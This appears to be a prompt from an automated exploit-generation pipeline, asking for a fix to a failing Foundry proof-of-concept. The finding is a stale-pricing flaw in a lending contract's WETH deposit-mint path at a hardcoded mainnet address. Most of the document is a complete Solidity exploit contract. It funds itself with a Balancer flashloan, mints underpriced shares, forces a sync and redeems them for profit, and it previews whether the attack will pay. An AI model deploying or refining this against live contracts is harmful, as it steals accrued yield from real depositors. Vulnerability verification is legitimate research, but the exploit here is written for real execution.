You are fixing a failing Foundry PoC for finding F-001.

Goal:
- Keep the exploit objective for this finding.
- Fix compile/runtime/test failure from logs.
- Return COMPLETE updated Solidity for `src/FlawVerifier.sol` only.
- Keep exploit logic aligned with the full `Exploit paths` list unless logs prove a stage is infeasible.
- Additional realistic public on-chain economic steps are allowed when required for execution (including flashloans/swaps/mint/burn), but keep the same exploit causality and justify in comments.

Hard constraints:
- Do NOT use external answers/PoCs/articles/repos (including DeFiHackLabs).
- Do NOT cheat: no vm.deal, vm.store, vm.etch, vm.mockCall, vm.prank, vm.startPrank, arbitrary balance injection, or arbitrary storage writes.
- Allowed: flashloans and realistic public on-chain actions.
- Work only from finding context (claim/paths/locations) + on-chain state context already provided in this workspace.
- Hard anti-cheat: profitToken MUST NOT be a token deployed during this PoC/test. Profit token must already exist on-chain at the fork block.
- Hard anti-cheat: do not deploy custom ERC20/token contracts to manufacture profit accounting.

Attempt strategy (must follow for this attempt):
- strategy_label: direct_or_existing_balance_first
- strategy_instructions: Prefer direct execution using verifier-held assets first. Only use temporary external funding if direct path is infeasible.
- Keep exploit root cause and `Exploit paths` unchanged; only vary funding/execution implementation details.

Finding:
- title: depositExactAmountETHMint skips pool synchronization and mints WETH shares at stale prices
- claim: `depositExactAmountETHMint()` calls `_depositExactAmountETH()` directly, unlike `depositExactAmountETH()` which is wrapped in `syncPool(WETH_ADDRESS)`. As a result, WETH deposits through the minting path skip `_preparePool`, interest accrual, cleanup of excess balance, share-price snapshotting, and the post-action share-price invariant. If the WETH pool has accrued yield or interest since the last sync, the function mints shares against stale `pseudoTotalPool` state.
- impact: An attacker can mint underpriced WETH lending shares, then redeem them after a later sync for more WETH than they should receive. This steals accrued yield from existing WETH lenders and can also bypass deposit-cap enforcement that depends on current pool totals.
- exploit_paths: ["Wait until the WETH pool has accrued interest/yield without being synced.", "Call `depositExactAmountETHMint()` instead of the synchronized `depositExactAmountETH()` path.", "Receive shares calculated from stale WETH pool totals.", "Redeem those shares after any later sync to extract excess WETH from the pool."]

Current FlawVerifier.sol:
```solidity
// SPDX-License-Identifier: UNLICENSED
pragma solidity =0.8.23;

interface IERC20Minimal {
    function balanceOf(address account) external view returns (uint256);
    function transfer(address to, uint256 amount) external returns (bool);
}

interface IWETH is IERC20Minimal {
    function deposit() external payable;
    function withdraw(uint256 amount) external;
}

interface IPositionNFTs {
    function reserved(address owner) external view returns (uint256);
}

interface IWiseLendingLike {
    function WETH_ADDRESS() external view returns (address);
    function POSITION_NFT() external view returns (address);
    function maxDepositValueToken(address token) external view returns (uint256);

    function globalPoolData(address token)
        external
        view
        returns (
            uint256 totalPool,
            uint256 utilization,
            uint256 totalBareToken,
            uint256 poolFee
        );

    function lendingPoolData(address token)
        external
        view
        returns (
            uint256 pseudoTotalPool,
            uint256 totalDepositShares,
            uint256 collateralFactor
        );

    function borrowPoolData(address token)
        external
        view
        returns (
            bool allowBorrow,
            uint256 pseudoTotalBorrowAmount,
            uint256 totalBorrowShares,
            uint256 borrowRate
        );

    function timestampsPoolData(address token)
        external
        view
        returns (
            uint256 timeStamp,
            uint256 timeStampScaling
        );

    function depositExactAmountETHMint() external payable returns (uint256);
    function syncManually(address token) external;
    function withdrawExactSharesETH(uint256 nftId, uint256 shares) external returns (uint256);
}

interface IBalancerVault {
    function flashLoan(
        IFlashLoanRecipient recipient,
        IERC20Minimal[] memory tokens,
        uint256[] memory amounts,
        bytes memory userData
    ) external;
}

interface IFlashLoanRecipient {
    function receiveFlashLoan(
        IERC20Minimal[] memory tokens,
        uint256[] memory amounts,
        uint256[] memory feeAmounts,
        bytes memory userData
    ) external;
}

contract FlawVerifier is IFlashLoanRecipient {
    error NoProfitableStaleState();
    error NoViableDepositAmount();
    error FlashLoanCallbackUnauthorized();
    error UnexpectedFlashLoanAsset();
    error PositionIdUnavailable();
    error FlashLoanRepaymentShortfall();
    error FlashLoanRepaymentTransferFailed();

    address internal constant TARGET = 0x37e49bf3749513A02FA535F0CbC383796E8107E4;
    address internal constant BALANCER_VAULT = 0xBA12222222228d8Ba445958a75a0704d566BF2C8;

    uint256 internal constant ONE_YEAR = 52 weeks;
    uint256 internal constant PRECISION_E18 = 1e18;
    uint256 internal constant DEFAULT_FLASH_DEPOSIT = 1_000 ether;
    uint256 internal constant FLASH_BUFFER = 0.1 ether;
    uint256 internal constant MIN_DEPOSIT = 0.01 ether;

    IWiseLendingLike internal immutable WISE;
    IWETH internal immutable WETH;
    IPositionNFTs internal immutable POSITION_NFT;

    uint256 internal _profitAmount;
    uint256 internal _pendingFlashDeposit;

    constructor() {
        WISE = IWiseLendingLike(TARGET);
        WETH = IWETH(WISE.WETH_ADDRESS());
        POSITION_NFT = IPositionNFTs(WISE.POSITION_NFT());
    }

    receive() external payable {}

    function executeOnOpportunity() external {
        delete _profitAmount;

        uint256 directDeposit = _findViableDeposit(address(this).balance);
        if (directDeposit != 0) {
            uint256 balanceBefore = address(this).balance;
            _executePathStrictExploit(directDeposit);
            uint256 balanceAfter = address(this).balance;
            if (balanceAfter > balanceBefore) {
                _profitAmount = balanceAfter - balanceBefore;
            }
            return;
        }

        uint256 flashDeposit = _findViableDeposit(DEFAULT_FLASH_DEPOSIT);
        if (flashDeposit == 0) {
            revert NoViableDepositAmount();
        }

        uint256 balanceBefore = address(this).balance;
        _pendingFlashDeposit = flashDeposit;

        IERC20Minimal[] memory tokens = new IERC20Minimal[](1);
        tokens[0] = IERC20Minimal(address(WETH));

        uint256[] memory amounts = new uint256[](1);
        amounts[0] = flashDeposit + FLASH_BUFFER;

        IBalancerVault(BALANCER_VAULT).flashLoan(
            this,
            tokens,
            amounts,
            abi.encode(flashDeposit)
        );

        delete _pendingFlashDeposit;
        uint256 balanceAfter = address(this).balance;
        if (balanceAfter > balanceBefore) {
            _profitAmount = balanceAfter - balanceBefore;
        }
    }

    function receiveFlashLoan(
        IERC20Minimal[] memory tokens,
        uint256[] memory amounts,
        uint256[] memory feeAmounts,
        bytes memory userData
    ) external override {
        if (msg.sender != BALANCER_VAULT) {
            revert FlashLoanCallbackUnauthorized();
        }

        if (tokens.length != 1 || address(tokens[0]) != address(WETH)) {
            revert UnexpectedFlashLoanAsset();
        }

        uint256 depositAmount = abi.decode(userData, (uint256));
        if (depositAmount == 0) {
            depositAmount = _pendingFlashDeposit;
        }

        WETH.withdraw(amounts[0]);

        _executePathStrictExploit(depositAmount);

        uint256 repayAmount = amounts[0] + feeAmounts[0];
        if (address(this).balance < repayAmount) {
            revert FlashLoanRepaymentShortfall();
        }

        WETH.deposit{value: repayAmount}();
        if (!IERC20Minimal(address(WETH)).transfer(BALANCER_VAULT, repayAmount)) {
            revert FlashLoanRepaymentTransferFailed();
        }
    }

    function profitToken() external pure returns (address) {
        return address(0);
    }

    function profitAmount() external view returns (uint256) {
        return _profitAmount;
    }

    function _executePathStrictExploit(uint256 depositAmount) internal {
        Preview memory preview = _preview(depositAmount);
        if (!preview.profitable) {
            revert NoProfitableStaleState();
        }

        uint256 reservedBefore = POSITION_NFT.reserved(address(this));

        // Path stage 2: use the unsynchronized ETH mint path so shares are minted
        // against stale WETH pseudoTotalPool state.
        uint256 mintedShares = WISE.depositExactAmountETHMint{value: depositAmount}();
        if (mintedShares == 0) {
            revert NoViableDepositAmount();
        }

        uint256 positionId = POSITION_NFT.reserved(address(this));
        if (positionId == 0) {
            positionId = reservedBefore;
        }
        if (positionId == 0) {
            revert PositionIdUnavailable();
        }

        // Path stage 4: force a later WETH sync so the stale accrual gets realized.
        WISE.syncManually(address(WETH));

        // Path stage 5: redeem the exact stale-priced shares after the sync.
        WISE.withdrawExactSharesETH(positionId, mintedShares);
    }

    function _findViableDeposit(uint256 availableEth) internal view returns (uint256) {
        if (availableEth < MIN_DEPOSIT) {
            return 0;
        }

        uint256 maxDeposit = _maxDepositAllowedByCap();
        if (maxDeposit < MIN_DEPOSIT) {
            return 0;
        }

        uint256 candidate = availableEth < maxDeposit ? availableEth : maxDeposit;
        if (candidate < MIN_DEPOSIT) {
            return 0;
        }

        while (candidate >= MIN_DEPOSIT) {
            Preview memory preview = _preview(candidate);
            if (preview.profitable) {
                return candidate;
            }
            candidate >>= 1;
        }

        return 0;
    }

    function _maxDepositAllowedByCap() internal view returns (uint256) {
        (
            ,
            ,
            uint256 totalBareToken,
            uint256 poolFee
        ) = WISE.globalPoolData(address(WETH));
        poolFee;
        (uint256 pseudoTotalPool, , ) = WISE.lendingPoolData(address(WETH));
        uint256 cap = WISE.maxDepositValueToken(address(WETH));

        uint256 occupied = totalBareToken + pseudoTotalPool;
        if (cap <= occupied) {
            return 0;
        }

        return cap - occupied;
    }

    struct Preview {
        bool profitable;
        uint256 sharesMinted;
        uint256 withdrawAmount;
        uint256 netProfit;
    }

    function _preview(uint256 depositAmount) internal view returns (Preview memory p) {
        (
            uint256 totalPool,
            ,
            uint256 totalBareToken,
            uint256 poolFee
        ) = WISE.globalPoolData(address(WETH));
        (
            uint256 pseudoTotalPool,
            uint256 totalDepositShares,
            uint256 collateralFactor
        ) = WISE.lendingPoolData(address(WETH));
        collateralFactor;
        (
            ,
            uint256 pseudoTotalBorrowAmount,
            ,
            uint256 borrowRate
        ) = WISE.borrowPoolData(address(WETH));
        (uint256 lastSyncTime, ) = WISE.timestampsPoolData(address(WETH));

        if (depositAmount < MIN_DEPOSIT || pseudoTotalPool == 0 || totalDepositShares == 0) {
            return p;
        }

        uint256 sharesMinted = (totalDepositShares * depositAmount) / pseudoTotalPool;
        if (sharesMinted == 0) {
            return p;
        }

        uint256 timeDelta = block.timestamp > lastSyncTime ? block.timestamp - lastSyncTime : 0;
        uint256 pseudoAfterDeposit = pseudoTotalPool + depositAmount;
        uint256 depositSharesAfterDeposit = totalDepositShares + sharesMinted;

        uint256 amountContract = IERC20Minimal(address(WETH)).balanceOf(TARGET);
        uint256 insidePool = totalPool + totalBareToken;
        uint256 difference = amountContract > insidePool ? amountContract - insidePool : 0;

        uint256 allowedDifference = (timeDelta * pseudoAfterDeposit) / ONE_YEAR;
        uint256 cleanupGain = difference > allowedDifference ? allowedDifference : difference;

        uint256 interestGain = 0;
        if (timeDelta != 0 && borrowRate != 0 && pseudoTotalBorrowAmount != 0) {
            interestGain = (borrowRate * timeDelta * pseudoTotalBorrowAmount) / (PRECISION_E18 * ONE_YEAR);
        }

        uint256 pseudoAfterSync = pseudoAfterDeposit + cleanupGain + interestGain;
        uint256 feeAmount = (interestGain * poolFee) / PRECISION_E18;

        uint256 feeShares = 0;
        if (feeAmount != 0 && pseudoAfterSync > feeAmount) {
            feeShares = (feeAmount * depositSharesAfterDeposit) / (pseudoAfterSync - feeAmount);
        }

        uint256 totalSharesAfterSync = depositSharesAfterDeposit + feeShares;
        if (totalSharesAfterSync == 0) {
            return p;
        }

        uint256 withdrawAmount = (sharesMinted * pseudoAfterSync) / totalSharesAfterSync;
        uint256 liquidPoolAfterDeposit = totalPool + depositAmount + cleanupGain;

        if (withdrawAmount <= depositAmount || withdrawAmount > liquidPoolAfterDeposit) {
            p.sharesMinted = sharesMinted;
            p.withdrawAmount = withdrawAmount;
            return p;
        }

        // Path stage 1 precondition: stale value must exist before sync, either from
        // elapsed unsynchronized borrow interest or from excess WETH sitting in the pool.
        if (timeDelta == 0 && cleanupGain == 0 && interestGain == 0) {
            return p;
        }

        p.profitable = true;
        p.sharesMinted = sharesMinted;
        p.withdrawAmount = withdrawAmount;
        p.netProfit = withdrawAmount - depositAmount;
    }
}

```

forge stdout (tail):
```

```

forge stderr (tail):
```
PATH_ALIGNMENT_ERROR: generated code does not cover paths indexes: 0
```

Requirements:
1. pragma ^0.8.20
2. include at least one deployable contract with zero-arg constructor
3. define fixed entry `executeOnOpportunity()` as no-arg external/public exploit function
4. no imports
5. keep exploit logic aligned to exploit_paths (same core actions and ordering intent)
6. expose `profitToken()` and `profitAmount()` getters for net realized profit
7. additional realistic public on-chain economic steps are allowed when required for execution, but keep exploit_paths core causality and justify in comments
8. output ONLY Solidity code
